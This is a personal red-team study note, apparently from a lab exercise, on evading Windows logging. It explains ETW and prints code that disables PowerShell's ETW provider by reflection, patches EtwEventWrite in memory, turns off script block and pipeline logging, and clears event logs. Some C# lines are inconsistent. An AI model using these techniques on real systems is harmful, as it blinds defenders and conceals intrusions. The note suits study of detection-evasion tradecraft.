---
{"dg-publish":true,"permalink":"/cards/red-team/evading-logging-and-monitoring/","tags":["red-team/host-evasion"]}
---

~ [[map-of-contents/red-team\|red-team]] 
### Introduction 
---
One of the biggest obstacles, if not the biggest obstacles in attacker's path is logging and monitoring as logging creates a physical record of an activity that can be analyzed for malicious activity.

Generally, it will start off with a host monitoring solution such as Sysmon then it will be shipped via collector/forwarder to a Security Information & Event Management (SIEM).

Though attacker may not have much control once logs are taken off a device, but can control what is on the device and how is it ingested.

The primary target is **Event Tracing For Windows (ETW)**.
#### Key Topics
---
- [[#Event Tracing|Overview of Event Tracing for Windows (ETW), its role in application and kernel-level logging, and why attackers target it.]]
    
- [[#Approaches to Log Evasion|Different strategies to limit logging without deleting logs, focusing on selectively disabling or modifying logging sources.]]
    
- [[#Tracing Instrumentation|Breakdown of ETW components: Event Controllers, Providers, and Consumers, and how they manage, generate, and read events.]]
    
- [[#Reflection for Fun and Silence|Using PowerShell reflection to modify the PSEtwLogProvider and disable event logging in-memory.]]
    
- [[#Patching Tracing Functions|Overwriting ETW logging function instructions in memory to force early returns, stopping event generation.]]
    
- [[#Providers via Policy|Modifying Group Policy settings in-memory to disable PowerShell script block and module logging without touching disk.]]
    
- [[#Challenge|Scenario-based example applying stealth logging bypasses while avoiding detection from blue team monitoring.]]
    
- [[#Conclusion|Final thoughts on minimizing detection while preserving system stability and reducing log visibility.]]
## Prerequisites
---

- [[cards/windows/Windows Internals\|Windows Internals]]
- [Malware Analysis Basics](https://medium.com/@alexxmacenas/c-malware-analysis-721c559d3957)

## Event Tracing
---
Both application and kernel level is handled by the ETW. While there are other services in place like _Event Logging_ and _Trace Logging,_ these are either extensions of ETW or less prevalent to attackers.

![Evading Logging and Monitoring.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring.png)

If you can **tamper with these components**, you can stop, modify, or hide logging entirely.

Now we know that ETW has visibility over a majority of the operating system, the best approach to take it down is to **limit its insight as much as possible** while maintaining environment integrity.
## Approaches to Log Evasion
---
These are various approaches available and their impacts on attackers and defenders.

Deleting the log is never an option due to one best security practices is shipping the host logs to a SIEM plus EWT also logs when a log file is deleted, defenders can use the following Event IDs:

![Evading Logging and Monitoring-1.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-1.png)

Even if the logs were destroyed first before being forwarded, for the analyst this will raises an alert as there is no logs being generated.

**What is the alternative to this aggressive approach?**

Attackers should identify what will log their actions and disabling or modifying only that to prevent logging.
## Tracing Instrumentation
---
As mentioned previously, ETW is broken up to three components with a goal to manage and correlate data, these data or Event logs in Windows is no different from a generic XML data, making it easy to process and interpret.

**Event Controllers** - Think of them as the “managers” of event tracing.

- They decide _when_ logging starts and stops.
- They set rules for _how much data to store_, _where to store it_, and _how big each log file should be_.
- They also decide _which Providers are allowed to send logs_ and can enable or disable them at will.

**Event Providers** - These are the “reporters” that generate the actual log events.

- A Provider might be an application, a Windows service, or part of the OS that knows how to create and send specific event data.
- They follow instructions from the Controller — if the Controller says 'start logging,'”' the Provider will generate events; if it says 'stop' the Provider stays quiet.
- Each Provider is responsible for _what_ data gets recorded when enabled.
- Below are four different types of providers:

![Evading Logging and Monitoring-2.png|450](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-2.png)

**Event Consumers** - are the **“readers” or “analysts”** in the ETW system.

- They **take the raw event data and interpret it**.
- A Consumer can choose _which_ sessions to read from — one or many — and can do so **in real time** or from **saved log files**.
- The most familiar example is **Event Viewer**, which acts as a Consumer that takes log data and displays it in a human-readable format.

Overview of the three components working together:

![Evading Logging and Monitoring-3.png|500](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-3.png)

Now the goal is to limit insights for ETW, we can do this by targeting components while mainitaining most of the data flow.

## Reflection for Fun and Silence
---
[[cards/red-team/Runtime Detection Evasion#PowerShell Reflection\|Read about what .NET assembly and reflection here]].

Within PowerShell, ETW providers are loaded into the session from a **.NET assembly**: `PSEtwLogProvider`, In a PowerShell session, most .NET assemblies are loaded in the same security context as the user at startup, knowing this we can modify the assembly fields and values through PowerShell Reflection.

The `PSEtwLogProvider` has a `m_enabled` field that determines whether logging is active, if we set it to `0` (false), PowerShell will stop sending events to ETW.

**Step 1 – Get the type for PSEtwLogProvider**

```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

**Step 2 – Get the ETW provider object**

```PowerShell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```

- You are pulling out the private, static field called `etwProvider` from `PSEtwLogProvider`.

- This `etwProvider` is an **instance of EventProvider** — the object that controls whether events are sent.

**Step 3 – Disable logging by setting m_enabled to 0**

```PowerShell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

- Here, we take the **EventProvider** type (the one that `$etwProvider` belongs to).
    
- We access its private `m_enabled` field, which is normally **1** when logging is on.

Now we can add this to a malicious script and see below for demonstration:

There are currently 386 events:

![Evading Logging and Monitoring-4.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-4.png)

Executing `whoami` then running the same command:

![Evading Logging and Monitoring-5.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-5.png)

Now executing the reflection.ps1 script (Untitled1.ps1) then checking the number of events, executing `whoami`, then finally check the current number of events:

![Evading Logging and Monitoring-6.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-6.png)
## Patching Tracing Functions
---
Patching a function in memory so it returns early, basically skipping the intented function. If you can disable ETW inside a process, security tools may not receive logs.

Here is a pseudo-code, it shows if you insert a `return` at the top of a function, the rest of the code never runs:

**Normal flow:**

```C
int x = 1
int y = 3
return x + y
// output: 4
```

**With early return:**

```C
int x = 1
return x
int y = 3
return x + y
// output: 1 (because it stops early)
```

In memory, every function has machine instructions (opcodes), if you can overwrite the start of ETW's logging function with opcodes that means 'return now', the rest of the code never runs.

![Evading Logging and Monitoring-7.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-7.png)

(This section needs more work #todo find the notes about LIFO) lmao.

Think of the **stack** like a pile of dinner plates where each _plate_ is a **return address** — a location in the program’s code to go back to after a function finishes.

The ETW uses a function called `EtwEventWrite` to record events, if you can patch this function to return immediately, no events get logged.

**The disassembly:**

```C
779f2459 33cc              xor ecx, esp
779f245b e8501a0100        call ntdll!_security_check_cookie
779f2460 8be5              mov esp, ebp
779f2462 5d                pop ebp
779f2463 c21400            ret 14h
```

The last instruction `ret 14h` means:

- **`ret`** - pop the return address from the stack and jump to it.
    
- **`14h`** - clean up 0x14 (20 in decimal) bytes from the stack (parameters passed to the function).
	-  That’s **the size of the arguments** passed to `EtwEventWrite`.

    - If each argument is 4 bytes (typical for 32-bit), then 20 bytes is **5 arguments**.


![Evading Logging and Monitoring-9.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-9.png)

1. “patch” the function by inserting a `ret 14h` at the **very start** of the function.
2. `ret 14h` becomes the top of the stack this means CPU will execute `ret 14h` immediately when the function is called.
3. When the function starts: 
	- `ret` means:
		- `Pop` the return address from the stack (this is the address of the code that called the function)
		- `Jump` to that address to continue the other remaining code aside from the function we wanted to skip, think of it having func1, func2, and func3 where in we want to skip func2 but still want to run func3 for some reason.

### Technical Applications
---

**1. Get the function’s memory address**

- ETW logging happens inside `ntdll.dll`, in a function called `EtwEventWrite`.

- Using `LoadLibrary("ntdll.dll")` and `GetProcAddress(...)`, the attacker gets a pointer to exactly where in memory this function lives.

```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```

**2. Change Memory Permissions**

- Normally executables and `ntdll.dll` in memory is marked as read-only.
- Using `VirtualProtect` to change the value to `0x40` (Read/Write/Execute) so they can overwrite the instructions inside.

```csharp
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```

**3. Write the malicious opcode** (`ret 14h`)

- `ret 14h` in machine code is `0xC2 0x14 0x00`.
- You use `Marshal.Copy` to write those bytes directly over the start of the function memory

```csharp
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);
```

**4. Restore original memory permission** (Optional cleanup)

To avoid leaving standing out evidence, you should put the original memory protection flags back.

```csharp
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
```

In this case the `PAGE_EXECUTE_READ (0x20)` so the function can be executed but **not changed**.

**5. Flush the CPU instruction cache** (Optional cleanup)

Ensures the CPU sees the new code immediately instead of running an old cached version.

```csharp
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```

Now we can compile these steps together and add them to a malicious script, **though** it will restrict more logs than you want.
## Providers via Policy
---
The ETW provides a lot of coverage out of the box, but it will disable some features unless specified because of the amount of logs they can create.

These features can be enabled by modifying the Group Policy Object, two of the most popular GPO providers coverage over PowerShell, including **script block logging** and **module logging**.

**EventID that relates to Script Block Logging, introduced in Pv4 and improved in Pv5:**

**Event IDs it uses:**

- **4103** - Logs command invocation (used in multiple contexts, not just script block logging).

- **4104** - Logs _actual script block execution_ (**this is the big one for defenders**).
	- Capture their full malicious script unless heavily obfuscated.

**EventID that relates to Module Logging, introduced in Pv3:**

- Tracks any PowerShell modules loaded and the data they send.
- Each module logs its own events.
- **What it logs:**

	- The **command name** being run (e.g., `Write-Host`, `Get-Process`, `Invoke-WebRequest`).
	
	- **Parameters** passed to that command.
	
	- The **pipeline** it ran in (so if it’s chained with other commands, you see the chain).
	    
	- **Context info** like user, machine, and host process.

- **Why it's noisy:**

	- Every command invocation gets logged — even harmless or repetitive ones.
	- In an environment with lots of PowerShell use, this can flood the logs with thousand of entries.

From an attacker's POV why they don't want to touch this or leave this enabled:

- **Downside:** Can still reveal parts of their activity (like which commands they run).

- **Upside:** So much noise that defenders may ignore it, or disable module logging entirely, leaving them with less risk of detection.

**Again**, the goal is to slowly limit visbility while not being so obvious.

### Group Policy Takeover
---
Both the module and script block logging can be both enabled here: `Administrative Templates -> Windows Components -> Windows PowerShell`

When starting a PowerShell session, PowerShell **loads certain system assemblies** (chunks of .NET code that handle logging, policy enforcement, etc.), these assemblies **cache** the Group Policy settings in memory for quick references - so PowerShell does not have to read from disk everytime.

As said previously, PowerShell assemblies run **in the same security context** as the current user. So modifying the key/value pairs in memory without touching the disk or editing the actual GPO is a much better option.

**Editing in-memory Group Policy cache:**

**Step 1 - Get to the cache memory:**

```C
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```

- `System.Management.Automation.Utils` is an Internal PowerShell utility class that has a private, static field called `cachedGroupPolicySettings` that holds Group Policy settings PowerShell has loaded.
- Reflection is used to:
	- Find that private field.
	- Extract it's current value into `$GroupPolicySettings` variable.

**Step 2 - Disable script block logging (4104)**

```C
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

- Inside the dictionary:

	- `'ScriptBlockLogging'` - The part of the GPO that controls script block logging.
	    
	- `'EnableScriptBlockLogging'` - The specific key that determines whether **Event ID 4104** logs script content. set the value to zero to disable

**Step 3 - Disable Invocation Logging**

```C
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

- This key controls **Event ID 4103**, which logs cmdlet and pipeline executions.
    
- Setting it to `0` disables module/pipeline invocation logging for this process.

**You should love this because:**

- Stealthier: it does not touch disk, no permanent changes
- Fast
- Granular: you can disable only the specific logging providers you want.

```C
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```

To comply with PS5.1 updates, the above script should be used

```C
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
```

Before:

![Evading Logging and Monitoring-10.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-10.png)

After:

![Evading Logging and Monitoring-11.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-11.png)
### Abusing Log Pipeline
---
Disabling the module logging in PowerShell for the **current session only** by setting `LogPipeLineExecutionDetails` from `$true` to `$false`.

**1. Obtain the target module**

```C
$module = Get-Module Microsoft.PowerShell.Utility
```

- `Get-Module` returns information about the module currently loaded in memory.
- In this case, they target `Microsoft.PowerShell.Utility` (a core module with many built-in cmdlets).

**2. Set the logging flag to false**

```C
$module.LogPipelineExecutionDetails = $false
```

- This property tells PowerShell whether to log cmdlet/pipeline execution from this module.
    
- Setting it to `$false` means: "Don’t send execution logs to Event Viewer for this module."

**3. Obtain the snap-in**

```C
$snap = Get-PSSnapin Microsoft.PowerShell.Core
```

- A **snap-in** is an older way PowerShell packaged cmdlets (used before modules were standard).
    
- Even though modules are more common now, some snap-ins still handle core logging.

**4. Disable logging for the snap-in too**

```C
$snap.LogPipelineExecutionDetails = $false
```

- **No privileges needed** - This uses public, documented PowerShell properties.

- **No registry or GPO changes** - So nothing obvious for defenders to spot.

- **Scope** - It only affects the current session, so it’s low risk for the attacker (but still cripples logging while they’re active).

## Challenge
---
> In this scenario, environment integrity is crucial, and the blue team is actively monitoring the environment. Your team has informed you that they are primarily concerned with monitoring web traffic; if halted, they will potentially alert your connection. The blue team is also assumed to be searching for suspicious logs; however, they are not forwarding logs

In my experience, the best way to interact with the web is using PowerShell as it has a lot of functionality to interact with the web. Knowing this I enumerated the Group Policy Object and sees both **Script and Module logging enabled.**

Plus we need to consider the fact that the blue team is assumed to be searching for suspicious logs.

Executing the modified PowerShell script and modue logging bypass, shows this error:

![Evading Logging and Monitoring-12.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-12.png)
So I tried obfuscating by adding `+` and `backticks` to modules and strings and now it works:

![Evading Logging and Monitoring-13.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-13.png)

Then based on the other information the logs are not being shipped navigating to Event Viewer and clearing the logs of PowerShell by navigating to _Microsoft/Windows/PowerShell/Operational_ or _Application And Services Logs/Windows PowerShell_ then clear logs.

![Evading Logging and Monitoring-14.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-14.png)
Filter for 4103 and 4104 then clear the logs, again deleting the web logs (coming from the PowerShell will alert the blue teamers).

![Evading Logging and Monitoring-15.png](/img/user/cards/red-team/images/Evading%20Logging%20and%20Monitoring-15.png)


### Advices, Examples/Case Studies, Questions and Problems
---

## Conclusion 
---
The main goal of evading event detection is to keep the environment as clean and intact as possible while preventing logging of your session or code.

